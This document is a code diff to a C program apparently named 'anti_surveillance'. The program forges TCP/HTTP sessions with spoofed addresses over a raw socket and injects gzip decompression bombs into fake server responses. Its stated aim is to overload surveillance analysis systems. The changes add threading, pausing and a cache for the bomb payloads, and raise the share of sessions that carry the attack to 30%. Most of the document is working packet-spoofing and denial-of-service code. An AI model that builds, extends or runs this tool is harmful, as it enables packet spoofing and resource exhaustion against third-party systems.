@@ -192,10 +192,12 @@ isnt sure then havinng somme situations like this only helps)
 #include <sys/stat.h>
 #include <sys/time.h>
 #include <zlib.h>
+#include <pthread.h>
 //#include "structs.h"
 //#include <list.h>
 //#include "utils.h"
 #include "anti_surveillance.h"
+
 
 
 #define min(a,b) ((a) < (b) ? (a) : (b))
@@ -328,11 +330,27 @@ int DNS_lookup(DNSQueue *qptr) {
 
 
 ResearchInfo *research_list = NULL;
+// paused are attacks awaiting for another thread/process to complete some task
 AS_attacks *attack_list = NULL;
 
 
 // The outgoing queue which gets wrote directly to the Internet wire.
 AttackOutgoingQueue *network_queue = NULL, *network_queue_last = NULL;
+pthread_mutex_t network_queue_mutex = PTHREAD_MUTEX_INITIALIZER;
+pthread_t network_thread;
+
+// another thread for dumping from queue to the network
+void *thread_network_flush(void *arg) {
+    while (1) {
+        pthread_mutex_lock(&network_queue_mutex);
+
+        FlushAttackOutgoingQueueToNetwork();
+        
+        pthread_mutex_unlock(&network_queue_mutex);
+
+        usleep(200);
+    }
+}
 
 // The raw socket file descriptor for writing the spoofed packets
 int raw_socket = 0;
@@ -342,7 +360,9 @@ int prepare_socket() {
     int rawsocket = 0;
     int one = 1;
     
-    rawsocket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if ((rawsocket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) <= 0)
+        return -1;
+
     if (setsockopt(rawsocket, IPPROTO_IP,IP_HDRINCL, (char *)&one, sizeof(one)) < 0)
         return -1;
 
@@ -381,7 +401,7 @@ int FlushAttackOutgoingQueueToNetwork() {
         rawsin.sin_addr.s_addr  = optr->dest_ip;
     
         // write the packet to the raw network socket.. keeping track of how many bytes
-        int bytes_sent = sendto(raw_socket, optr->buf, optr->size, 0, (struct sockaddr *) &rawsin, sizeof(rawsin));
+        int bytes_sent = optr->size;//sendto(raw_socket, optr->buf, optr->size, 0, (struct sockaddr *) &rawsin, sizeof(rawsin));
 
         // I need to perform some better error checking than just the size..
         if (bytes_sent != optr->size) break;
@@ -393,8 +413,7 @@ int FlushAttackOutgoingQueueToNetwork() {
         onext = optr->next;
 
         // clear buffer
-        if (optr->buf)
-            free(optr->buf);
+        PtrFree(&optr->buf);
 
         // free structure..
         free(optr);
@@ -440,14 +459,22 @@ int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
     // Just in case some function later (during flush) will want to know which attack the buffer was generated for
     optr->attack_info = attack;
 
+    //pthread_mutex_lock(&network_queue_mutex);
+
     // Put into the linked list using a small optimization of keeping information regarding the last
     // structure that was appended.. It allows us to quickly add another entry.  
     if (network_queue == NULL) {
         network_queue = network_queue_last = optr;
     } else {
-        network_queue_last->next = optr;
-        network_queue_last = optr;
+        if (network_queue_last != NULL) {
+            network_queue_last->next = optr;
+            network_queue_last = optr;
+        } else {
+            L_link_ordered((LINK **)network_queue, (LINK *)optr);
+        }
     }
+
+    //pthread_mutex_unlock(&network_queue_mutex);
 
     return 1;
 }
@@ -480,11 +507,45 @@ int AS_session_queue(int id, uint32_t src, uint32_t dst, int src_port, int dst_p
 
     // what function will be used to generate this sessions parameters? (ie: HTTP_Create())
     aptr->function = function;
-    
+
+    // initialize a mutex for this structure
+    //aptr->pause_mutex = PTHREAD_MUTEX_INITIALIZER;
+    pthread_mutex_init(&aptr->pause_mutex, NULL);
+
     // LIFO i decided it doesnt matter since the attacks are all happening simultaneously...
     // if it becomes a problem its a small fix.  but your queues should also flush properly anyhow..
     aptr->next = attack_list;
     attack_list = aptr;
+
+    return 1;
+}
+
+// pause by pointer, or identifier
+int AS_pause(AS_attacks *attack, int id, int resume) {
+    AS_attacks *aptr = attack;
+
+    // try to find by id if the calling function didnt pass an id
+    if (attack == NULL) {
+        // enumerate through attack queue looking for this ID
+        aptr = attack_list;
+        while (aptr != NULL) {
+            if (aptr->id == id) break;
+
+            aptr = aptr->next;
+        }
+    }
+
+    // couldnt find the attack queue
+    if (aptr == NULL) {
+        return -1;
+    }
+
+    // make sure we can lock it..
+    if (pthread_mutex_trylock(&aptr->pause_mutex) != 0) return 0;
+    // if so.. its not being used for anotheer pthread...    
+    aptr->paused = resume ? 0 : 1;
+
+    pthread_mutex_unlock(&aptr->pause_mutex);
 
     return 1;
 }
@@ -560,6 +621,9 @@ void PacketQueue(AS_attacks *aptr) {
     struct timeval time_diff;
 
     gettimeofday(&tv, NULL);
+
+    // if this thread is paused waiting for some other thread, or process to complete a task
+    if (aptr->paused == 1) return;
 
     // if its already finished.. lets just move forward
     if (aptr->completed) return;
@@ -669,28 +733,39 @@ void AS_remove_completed() {
     AS_attacks *aptr = attack_list, *anext = NULL, *alast = NULL;
 
     while (aptr != NULL) {
-        if (aptr->completed == 1) {
-            // we arent using a normal for loop because
-            // it'd have an issue with ->next after free
-            anext = aptr->next;
+        if (pthread_mutex_trylock(&aptr->pause_mutex) == 0) {
 
-            // free all packets from this attack structure..
-            AttackFreeStructures(aptr);
+            if (aptr->completed == 1) {
+                // try to lock this mutex
+                
+                    // we arent using a normal for loop because
+                    // it'd have an issue with ->next after free
+                    anext = aptr->next;
 
-            if (attack_list == aptr)
-                attack_list = anext;
-            else
-                alast->next = anext;
+                    // free all packets from this attack structure..
+                    AttackFreeStructures(aptr);
 
-            // free the structure itself
-            free(aptr);
+                    if (attack_list == aptr)
+                        attack_list = anext;
+                    else
+                        alast->next = anext;
 
-            aptr = anext;
+                    pthread_mutex_unlock(&aptr->pause_mutex);
+                    
+                    // free the structure itself
+                    free(aptr);
 
-            continue;
-        }
+                    //printf("removed\n");
+                    aptr = anext;
+
+                    continue;
+                }
+
+                pthread_mutex_unlock(&aptr->pause_mutex);
+            }
 
         alast = aptr;
+
         aptr = aptr->next;
     }
 
@@ -702,27 +777,48 @@ void AS_remove_completed() {
 int AS_perform() {
     AS_attacks *aptr = attack_list;
     attack_func func;
+    int r = 0;
     
     while (aptr != NULL) {
-        //printf("aptr %p next %p\n", aptr, aptr->next);
-        if (aptr->completed == 0) {
-            // if we dont have any prepared packets.. lets run the function for this attack
-            if (aptr->packets == NULL) {
-                // call the correct function for performing this attack to build packets.. it could be the first, or some adoption function decided to clear the packets
-                // to call the function again
-                func = (attack_func)aptr->function;
-                if (func != NULL) (*func)(aptr);
+        
+        // try to lock this mutex
+        if (pthread_mutex_trylock(&aptr->pause_mutex) == 0) {  
+            
+            // if we need to join this thread (just in case pthread will leak otherwise)
+            if (aptr->join) {
+                pthread_join(aptr->thread, NULL);
+                aptr->join = 0;
+            }
+            
+            //printf("aptr %p next %p\n", aptr, aptr->next);
+            if (aptr->paused == 0 && aptr->completed == 0) {
+                r = 0;
+                // if we dont have any prepared packets.. lets run the function for this attack
+                if (aptr->packets == NULL) {
+                    // call the correct function for performing this attack to build packets.. it could be the first, or some adoption function decided to clear the packets
+                    // to call the function again
+                    func = (attack_func)aptr->function;
+                    if (func != NULL) {
+                        // r = 1 if we created a new thread
+                        r = ((*func)(aptr) == NULL) ? 0 : 1;
+                    }
+                }
+
+                if (!r && !aptr->paused) {
+                    // If those function were successful then we would have some packets here to queue..
+                    if ((aptr->current_packet != NULL) || (aptr->packets != NULL)) {
+                        PacketQueue(aptr);
+                    } else {
+                        // otherwise we mark as completed to just free the structure
+                        aptr->completed = 1;
+                    }
+                }
             }
 
-            // If those function were successful then we would have some packets here to queue..
-            if ((aptr->current_packet != NULL) || (aptr->packets != NULL)) {
-                PacketQueue(aptr);
-            } else {
-                // otherwise we mark as completed to just free the structure
-                aptr->completed = 1;
-            }
+            pthread_mutex_unlock(&aptr->pause_mutex);
         }
 
+        // go to the next
         aptr = aptr->next;
     }
 
@@ -740,13 +836,13 @@ int AS_perform() {
 
 // free a pointer after verifying it even exists
 void PtrFree(char **ptr) {
-    if (ptr != NULL && *ptr) {
+    if (ptr != NULL && *ptr != NULL) {
         free(*ptr);
         *ptr = NULL;
     }
 }
 
-// clean up the structures used to keep information required for building the low level network packets
+// clean up the structures used to keep information requira ed for building the low level network packets
 void PacketBuildInstructionsFree(AS_attacks *aptr) {
     PacketBuildInstructions *iptr = aptr->packet_build_instructions, *inext = NULL;
 
@@ -802,7 +898,7 @@ void BuildPackets(AS_attacks *aptr) {
 
     while (ptr != NULL) {
         // Build the options, single packet, and verify it worked out alright.
-        if ((PacketBuildOptions(ptr) != 1) || (BuildSinglePacket(ptr) != 1) ||
+        if ((PacketBuildOptions(aptr, ptr) != 1) || (BuildSinglePacket(ptr) != 1) ||
                  (ptr->packet == NULL) || (ptr->packet_size <= 0)) {
             // Mark for deletion otherwise
             aptr->completed = 1;
@@ -856,7 +952,8 @@ void BuildPackets(AS_attacks *aptr) {
 
 //https://tools.ietf.org/html/rfc1323
 // Incomplete but within 1 day it should emulate Linux, Windows, and Mac...
-int PacketBuildOptions(PacketBuildInstructions *iptr) {
+// we need access to the attack structure due to the timestampp generator having a response portion from the opposide sides packets
+int PacketBuildOptions(AS_attacks *aptr, PacketBuildInstructions *iptr) {
     // need to see what kind of packet by the flags....
     // then determine which options are necessaray...
     // low packet id (fromm 0 being syn connection) would require the tcp window size, etc
@@ -997,9 +1094,6 @@ int BuildSinglePacket(PacketBuildInstructions *iptr) {
         free(checkbuf);
     }
 
-    // copy the IP, and TCP header to the final packet
-    memcpy(final_packet, p, sizeof(struct packet));
-
     // copy the TCP options to the final packet
     if (iptr->options_size)
         memcpy(final_packet + sizeof(struct packet), iptr->options, iptr->options_size);
@@ -1075,7 +1169,7 @@ PacketBuildInstructions *BuildInstructionsNew(PacketBuildInstructions **list, ui
 
 // allocates & copies data into a new pointer
 int DataPrepare(char **data, char *ptr, int size) {
-    char *buf = (char *)calloc(1, size);
+    char *buf = (char *)calloc(1, size + 1);
     if (buf == NULL) return -1;
 
     memcpy(buf, ptr, size);
@@ -1103,12 +1197,14 @@ struct _operating_system_emulation_parameters {
 };
 
 enum {
-    OS_LINUX=1,
-    OS_GOOGLE_LINUX=2,
-    OS_FREEBSD=4,
-    OS_XP=8,
-    OS_WIN7=16,
-    OS_CISCO=32
+    OS_SERVER=1,
+    OS_CLIENT=2,
+    OS_LINUX=4,
+    OS_GOOGLE_LINUX=8,
+    OS_FREEBSD=16,
+    OS_XP=32,
+    OS_WIN7=64,
+    OS_CISCO=128
 };
 
 // to do add counting logic, and percentage choices
@@ -1149,6 +1245,7 @@ int GenerateTCPConnectionInstructions(ConnectionProperties *cptr, PacketBuildIns
     PacketBuildInstructions *build_list = NULL;
     int packet_flags = 0;
     int packet_ttl = 0;
+    int ret = -1;
 
     // first we need to generate a connection syn packet..
     packet_flags = TCP_FLAG_SYN|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW;
@@ -1180,7 +1277,8 @@ int GenerateTCPConnectionInstructions(ConnectionProperties *cptr, PacketBuildIns
 
     return 1;
     err:;
-    return 0;
+    printf("error\n");
+    return ret;
 }
 
 
@@ -1242,7 +1340,10 @@ int GenerateTCPSendDataInstructions(ConnectionProperties *cptr, PacketBuildInstr
         if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
         if (DataPrepare(&bptr->data, data_ptr, packet_size) != 1) goto err;
         bptr->data_size = packet_size;
-        bptr->header_identifier = *src_identifier++;
+
+        bptr->header_identifier = *src_identifier;
+        *src_identifier += 1;
+        
         bptr->client = from_client;
         bptr->ack = *remote_seq;
         bptr->seq = *my_seq;
@@ -1255,7 +1356,10 @@ int GenerateTCPSendDataInstructions(ConnectionProperties *cptr, PacketBuildInstr
         packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
         packet_ttl = from_client ? cptr->server_ttl : cptr->client_ttl;
         if ((bptr = BuildInstructionsNew(&build_list, dest_ip, source_ip, dest_port, source_port, packet_flags, packet_ttl)) == NULL) goto err;
-        bptr->header_identifier = *dst_identifier++;
+
+        bptr->header_identifier = *dst_identifier;
+        *dst_identifier += 1;
+
         bptr->ack = *my_seq;
         bptr->seq = *remote_seq;
         bptr->client = !from_client;
@@ -1474,6 +1578,7 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     ConnectionProperties cptr;
     HTTPExtraAttackParameters *eptr = NULL;
     int i = 0;
+    int ret = -1;
 
     // these are in headers.. and seems to be +1 fromm start..
     // we need to get more requests for when they begin to *attempt* to filter these out..
@@ -1491,19 +1596,22 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
 
     uint32_t client_seq = rand()%0xFFFFFFFF;
     uint32_t server_seq = rand()%0xFFFFFFFF;
-    
+    /*
     int body_size = 0;
     char *body = (char *)malloc(server_size + 1);
     
     if (body != NULL) {
         memcpy(body, server_body, server_size);
         body_size = server_size;
-    }
+    } */
 
 
     //OsPick(int options, int *ttl, int *window_size)
-    OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
-    OsPick(OS_LINUX,  &cptr.server_ttl, &cptr.max_packet_size_server);
+    //OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
+    //OsPick(OS_LINUX,  &cptr.server_ttl, &cptr.max_packet_size_server);
+
+    cptr.client_ttl = 64;
+    cptr.server_ttl = 53;
 
     cptr.server_ip = server_ip;
     cptr.server_port = server_port;
@@ -1519,20 +1627,8 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     cptr.client_emulated_operating_system = 0;
     cptr.server_emulated_operating_system = 0;
     
-    // would we like to inject some GZip attacks? Lets keep it down to 10% for now (obviously ill make it dynamic/controlled w strategy later)
-    eptr = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;
-    if (eptr) {
-        if (eptr->gzip_attack) {
-            if ((rand()%100) <= eptr->gzip_percentage) {
-                // this is one of the sessions we will insert the gzip attacks in..
-                // in future right here we would send information to another PID, or thread
-                // stating it should calculate gzip and send back the body for us
-                // ill work out later how to do it with more advanced http sefssions
-                // such as using identity lists from databases, etc
-                GZipAttack(0, &body_size, &body, eptr->gzip_size, eptr->gzip_injection_rand);
-            }
-        }
-    }
+    // Moved all logic code inside the attack function
+    //GZipAttack(aptr, &body_size, &body);
 
     // open the connection...
     if (GenerateTCPConnectionInstructions(&cptr, &build_list) != 1) goto err;
@@ -1541,7 +1637,7 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     if (GenerateTCPSendDataInstructions(&cptr, &build_list, 1, client_body, client_size) != 1) goto err;
     
     // now we must send data from the server to the client (web page body)
-    if (GenerateTCPSendDataInstructions(&cptr, &build_list, 0, body, body_size) != 1) goto err;
+    if (GenerateTCPSendDataInstructions(&cptr, &build_list, 0, server_body, server_size) != 1) goto err;
 
     // now lets close the connection from client side first
     if (GenerateTCPCloseConnectionInstructions(&cptr, &build_list, 1) != 1) goto err;
@@ -1552,12 +1648,12 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     // now lets build the low level packets for writing to the network interface
     BuildPackets(aptr);
 
-    if (body != NULL) free(body);
+    //if (body != NULL) free(body);
 
     // all packets done! good to go!
-    return 1;
+    ret = 1;
     err:;
-    return -1;
+    return ret;
 }
 
 // for debugging to test various gzip parameters
@@ -1567,6 +1663,27 @@ int total_gzip_count = 0;
 char *gzip_cache = NULL;
 int gzip_cache_size = 0;
 int gzip_cache_count = 0;
+int gzip_initialized = 0;
+pthread_mutex_t gzip_cache_mutex = PTHREAD_MUTEX_INITIALIZER;
+
+void gzip_init() {
+    pthread_mutexattr_t attr;
+
+    if (!gzip_initialized) {
+        gzip_initialized = 1;
+        
+        pthread_mutexattr_setprotocol(&attr, PTHREAD_PRIO_NONE);
+        pthread_mutexattr_setprioceiling(&attr, 0); 
+
+        pthread_mutex_init(&gzip_cache_mutex, &attr);
+
+        
+    }
+
+    return;
+}
+
+
 
 // This function will perform a GZIP Attack on a body.  I wrote it to take a previously compressed HTTP result, decompress it,
 // insert attacks, recompress it, replace the original, and to cache it for future use.  The caching will reuse the same
@@ -1579,7 +1696,7 @@ int gzip_cache_count = 0;
 // compressing that character it would repeat those specific characters a million times.  It will create an extra megabyte of information
 // at that characters location. Compression on top of all other analysis engines used to generate actual intelligence from raw internet
 // data would clog those threads, CPUs, and possibly even hard drives up drastically.
-int GZipAttack(int options, int *size, char **server_body, int attack_size, int how_many_different_insertions) {
+int GZipAttack(AS_attacks *aptr, int *size, char **server_body) {
     int i = 0, n = 0, y = 0, q = 0, r = 0;
     char *data = NULL;
     int data_size = 0;
@@ -1598,6 +1715,7 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
     int compression_max_size = 0;
     int ret = -1;
     int header_size = 0;
+    HTTPExtraAttackParameters *options = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;
 
     // will contain 0 or 1 where  insertions go
     // this coould be a bitmask whatever.. dont care atm
@@ -1607,32 +1725,42 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
     // with only compressing 1 every 10-100 uses kept it between 2 minutes and 2min:10
     // 15 was is 2 minutes 4 seconds for 43k gzip attack injections.. each between 1-5 count of 1megabyte injections
     // the megabytes are the same character randomly in the output 1meg times
-    if (gzip_cache && gzip_cache_count > 0) {
-        buf = (char *)malloc(gzip_cache_size);
-        if (buf == NULL) return 0;
-        memcpy(buf, gzip_cache, gzip_cache_size);
+    pthread_mutex_lock(&gzip_cache_mutex);
 
-        gzip_cache_count--;
+    if (options) {
+        if (gzip_cache && gzip_cache_count > 0) {
+            buf = (char *)malloc(gzip_cache_size + 1);
+            if (buf == NULL) {
+                pthread_mutex_unlock(&gzip_cache_mutex);
+                return 0;
+            }
+            memcpy(buf, gzip_cache, gzip_cache_size);
 
-        // free original server body so that we can copy over this cached one fromm the previous gzi attack
-        PtrFree(server_body);
+            gzip_cache_count--;
 
-        // move the pointer of our coppy for the calling function...
-        *server_body = buf;
-        // set proper size from cache size
-        *size = gzip_cache_size;
+            // free original server body so that we can copy over this cached one fromm the previous gzi attack
+            PtrFree(server_body);
 
-        // keep count (for debugging, remove)
-        total_gzip_count++;
+            // move the pointer of our coppy for the calling function...
+            *server_body = buf;
+            // set proper size from cache size
+            *size = gzip_cache_size;
 
-        return 1;
-    } else {
-        PtrFree(&gzip_cache);
-        gzip_cache_count = 0;
-        gzip_cache_size = 0;
+            // keep count (for debugging, remove)
+            total_gzip_count++;
+
+            pthread_mutex_unlock(&gzip_cache_mutex);
+
+            return 1;
+        } else {
+            PtrFree(&gzip_cache);
+            gzip_cache_count = 0;
+            gzip_cache_size = 0;
+        }
     }
 
-    srand(time(0));
+    pthread_mutex_unlock(&gzip_cache_mutex);
+
     // first we unzip it so we can modify..
     // ill do some proper verification later.. but remember? we are supplying the body ourselves..
     // I hoppe if someone doesn't understand whats going on they dont attempt to change things...
@@ -1698,14 +1826,14 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
     compressed = (char *)malloc(compression_max_size + 1);
 
     // buffer for injecting attack
-    buf = (char *)calloc(1, attack_size + 1);
+    buf = (char *)calloc(1, options->gzip_size + 1);
 
     // ensure both were allocated properly..
     if ((insertions == NULL) || (compressed == NULL) || (buf == NULL))
         goto end;
 
     // how many places will we insert? lets randomly pick how many & mark them
-    i = 1 + (rand() % (how_many_different_insertions - 1));
+    i = 1 + (rand() % (options->gzip_injection_rand - 1));
 
     // if its too many for this server body.. lets do it 1 less time than all characters
     if (i > data_size) i = data_size - 1;
@@ -1765,9 +1893,9 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
         // check if we are supposed to insert here...
         if (insertions[n] == 1) {
             // set all of buf (attack buf) to the current character
-            memset(buf, *sptr, attack_size);
+            memset(buf, *sptr, options->gzip_size);
 
-            outstream.avail_in = attack_size;
+            outstream.avail_in = options->gzip_size;
             outstream.next_in = (Bytef *)buf;
 
             // we output it but calculate just so there are no bullshit issues later
@@ -1798,7 +1926,7 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
         i = deflate(&outstream, Z_NO_FLUSH);
 
         // not enough buffer space.. lets realloc
-        if (i == -5) {
+        if (i == Z_BUF_ERROR) {
             compression_max_size *= 2;
             compressed_realloc = (char *)realloc((void *)compressed, compression_max_size + 1);
             
@@ -1853,23 +1981,30 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
     *size = compressed_out + header_size;
 
 
+    pthread_mutex_lock(&gzip_cache_mutex);
+
     // cache this gzip attack for the next 15 requests of another
     if (gzip_cache == NULL) {
         gzip_cache = (char *)malloc(*size + 1);
         if (gzip_cache != NULL) {
             memcpy(gzip_cache, *server_body, *size);
             gzip_cache_size = *size;
-            gzip_cache_count = 15;
+            gzip_cache_count = options->gzip_cache_count;
+
+            total_gzip_count++;
         }
     }
-    
-    total_gzip_count++;
+
+    pthread_mutex_unlock(&gzip_cache_mutex);
+
     //printf("\rgzip injected\t\t\n");
     ret = 1;
 end:;
 
+    
+
     // free the decompression buffer.. if its still allocated (and wasnt replaced after a successful compression)
-    if (ret != 1 && data != *server_body) PtrFree(&data);
+    if (ret != 1 && data && data != *server_body) PtrFree(&data);
 
     // free the insertion (table) we used to randomize our insertions
     PtrFree(&insertions);
@@ -1890,12 +2025,101 @@ end:;
 // PCAP may be useful to have in the full blown application but im interested in fully automated personally..
 // but you could just as well generate pre-timestamp scenarios and SCP/prepare boxes worldwide for attacking
 // worldwide platforms.
+int PtrDuplicate(char *ptr, int size, char **dest, int *dest_size) {
+    char *buf = NULL;
+    
+    if ((ptr == NULL) || (size <= 0))
+        return 0;
 
+    if ((buf = (char *)malloc(size + 1)) == NULL)
+        return -1;
+
+    memcpy(buf, ptr, size);
+
+    *dest = buf;
+    *dest_size = size;
+
+    return 1;
+}
 
 char *G_client_body = NULL;
 char *G_server_body = NULL;
 int G_client_body_size = 0;
 int G_server_body_size = 0;
+    
+
+
+// details required for the new thread to understand its current parameters
+typedef struct _gzip_thread_details {
+    AS_attacks *aptr;
+    char *client_body;
+    int client_body_size;
+    char *server_body;
+    int server_body_size;
+} GZIPDetails;
+
+
+// The thread has been started to perform a GZIP attack without affecting non GZIP attack packets
+void *thread_gzip_attack(void *arg) {
+    int i = 0;
+    GZIPDetails *dptr = (GZIPDetails *)arg;
+    AS_attacks *aptr = dptr->aptr;
+
+    // lock mutex so AS_perform() leaves it alone for the time being
+    pthread_mutex_lock(&aptr->pause_mutex);
+
+    aptr->paused = 1;
+
+    // GZIP Attack
+    GZipAttack(aptr, &dptr->server_body_size, &dptr->server_body);
+ 
+    // build session using the modified server body w gzip attacks
+    i = BuildHTTPSession(aptr, aptr->dst, aptr->src, aptr->destination_port, dptr->client_body, dptr->client_body_size, 
+        dptr->server_body, dptr->server_body_size);
+            
+    // free the details that were passed to us
+    PtrFree((char **)&dptr->server_body);
+    PtrFree((char **)&dptr->client_body);
+    
+
+    // unpause the thread
+    aptr->paused = 0;
+
+    // set so AS_perform() will join.. just in case it causes leaks if you dont perform this..
+    aptr->join = 1;
+
+    // release mutex
+    pthread_mutex_unlock(&aptr->pause_mutex);
+
+    PtrFree((char **)&dptr);
+    // exit this thread
+    pthread_exit(NULL);
+}
+
+
+
+int GZIP_Thread(AS_attacks *aptr, char *client_body, int client_body_size, char *server_body, int server_body_size) {
+    GZIPDetails *dptr = (GZIPDetails *)calloc(1, sizeof(GZIPDetails));
+    if (dptr == NULL) return -1;
+
+    // all details the thread will need to complete its tasks
+    dptr->aptr = aptr;
+    dptr->client_body = client_body;
+    dptr->client_body_size = client_body_size;
+    dptr->server_body = server_body;
+    dptr->server_body_size = server_body_size;
+
+    if (pthread_create(&aptr->thread, NULL, thread_gzip_attack, (void *)dptr) == 0) {
+        // if we created the thread successful, then we want to pause the thread
+        //aptr->paused = 1;
+        
+        return 1;
+    } else {
+        // otherwise we should free that structure we just created to pass to that new thread
+        PtrFree((char **)&dptr);
+        printf("pthread error\n");
+    }
+}
 
 // this function was created as a test during genertion of the TEST mode (define TEST at top)
 // it should be removed, and handled in anoother location for final version..
@@ -1904,23 +2128,49 @@ int G_server_body_size = 0;
 void *HTTP_Create(AS_attacks *aptr) {
     int i = 0;
     HTTPExtraAttackParameters *eptr = NULL;
+    char *server_body = NULL, *client_body = NULL;
+    int server_body_size = 0, client_body_size = 0;
 
-    eptr = (HTTPExtraAttackParameters *)calloc(1, sizeof(HTTPExtraAttackParameters));
-    if (eptr != NULL) {
-        // enable gzip attacks
-        eptr->gzip_attack = 1;
-        // percentage of sessions to perform gzip attacks on
-        eptr->gzip_percentage = 3;
-        // size of the gzip injections (100 megabytes here)
-        eptr->gzip_size = 1024*1024 * 1;
-        // between 1-5 injections
-        eptr->gzip_injection_rand = 5;
-        // how many times to reuse the same cache before creating a new one?
-        //eptr->gzip_cache_count = 5000;
-    }   
+
+    // if gzip threads off.. we'd hit this code twice.. maybe use a static structure which wont need to be freed...
+    if (aptr->extra_attack_parameters == NULL) {
+        eptr = (HTTPExtraAttackParameters *)calloc(1, sizeof(HTTPExtraAttackParameters));
+        if (eptr != NULL) {
+            // enable gzip attacks
+            eptr->gzip_attack = 1;
+            // percentage of sessions to perform gzip attacks on
+            eptr->gzip_percentage = 30;
+            // size of the gzip injections (100 megabytes here)
+            eptr->gzip_size = 1024*1024 * 1;
+            // between 1-5 injections
+            eptr->gzip_injection_rand = 5;
+            // how many times to reuse the same cache before creating a new one?
+            eptr->gzip_cache_count = 150000;
+
+            // attach the extra attack parameters to this session
+            aptr->extra_attack_parameters = eptr;
+    
+        }
+    } else {
+        eptr = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;
+    }
+
+    
+    // verify we perform on this body
+    if (eptr != NULL && eptr->gzip_attack == 1) {
+        // make sure we keep it to a specific percentage
+        if ((rand()%100) < eptr->gzip_percentage) {
+
+            if (PtrDuplicate(G_server_body, G_server_body_size, &server_body, &server_body_size) &&
+                PtrDuplicate(G_client_body, G_client_body_size, &client_body, &client_body_size)) {
+                    // if the function paused the thread.. then we are done for now with this structure.. lets return
+                    if ((GZIP_Thread(aptr, client_body, client_body_size, server_body, server_body_size) == 1) || aptr->paused) {
+                        return (void *)1;
+                    }
+                }
+        }
+    }
  
-    // attach the extra attack parameters to this session
-    aptr->extra_attack_parameters = eptr;
     
     #ifndef BIG_TEST
         printf("client body %p size %d\nserver body %p size %d\n",G_client_body, G_client_body_size, G_server_body,
@@ -1928,7 +2178,7 @@ void *HTTP_Create(AS_attacks *aptr) {
     #endif
 
     // lets try new method    
-    i = BuildHTTPSession(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,
+    i = BuildHTTPSession(aptr, aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,
         G_server_body, G_server_body_size);
 
     #ifndef BIG_TEST
@@ -1936,7 +2186,11 @@ void *HTTP_Create(AS_attacks *aptr) {
     
         printf("Packet Count: %d\n", L_count((LINK *)aptr->packets));
     #endif
-    }
+
+    // if these pointers are not NULL then we need to free them (ptrfree checks)
+    PtrFree(&client_body);
+    PtrFree(&server_body);
+}
     
 
 
@@ -1964,12 +2218,14 @@ typedef struct pcaprec_hdr_s {
 // dump all outgoing queued network packets to a pcap file (to be viewed/analyzed, or played directly to the Internet)
 int dump_pcap(char *filename, AttackOutgoingQueue *packets) {    
     AttackOutgoingQueue *ptr = packets;
+    AttackOutgoingQueue *qnext = NULL;
     pcap_hdr_t hdr;
     pcaprec_hdr_t packet_hdr;
     FILE *fd;
     struct timeval tv;
     struct ether_header ethhdr;
     int ts = 0;
+    int out_count = 0;
 
     gettimeofday(&tv, NULL);
 
@@ -2016,7 +2272,17 @@ int dump_pcap(char *filename, AttackOutgoingQueue *packets) {
         fwrite((void *)&ethhdr, 1, sizeof(struct ether_header), fd);
         fwrite((void *)ptr->buf, 1, ptr->size, fd);
 
-        ptr = ptr->next;
+        PtrFree(&ptr->buf);
+
+        qnext = ptr->next;
+        
+        PtrFree((char **)&ptr);
+
+        ptr = qnext;
+
+        if (out_count++ > 1000) break;
+
+        
     }
 
     fclose(fd);
@@ -2063,6 +2329,19 @@ int main(int argc, char *argv[]) {
             argv[0]);
         exit(-1);
     }
+
+    srand(time(0));
+
+    // initialize a few things for gzip threading
+    gzip_init();
+
+    // initialize mutex for network queue...
+    //pthread_mutex_init(&network_queue_mutex, NULL);
+
+    // start network queue thread
+    /*if (pthread_create(&network_thread, NULL, thread_network_flush, (void *)NULL) != 0) {
+        printf("couldnt start network thread\n");
+    }*/
 
     // *** Not much error checking on anything  here.. its quick & dirty.
     // client information
@@ -2126,7 +2405,7 @@ int main(int argc, char *argv[]) {
 
         if (repeat % 1000) {
             printf("\rCount: %05d\t\t", repeat);
-            fflush(stdout);
+             fflush(stdout);
         }
     }
     
@@ -2152,6 +2431,9 @@ int main(int argc, char *argv[]) {
     printf("Gzip Count: %d\n", total_gzip_count);
     // now lets write to pcap file.. all of those packets.. open up wireshark.
     dump_pcap((char *)"output.pcap", network_queue);
+
+    //printf("sleeping.. check ram usage\n");
+    //sleep(300);
 
     exit(0);
 }
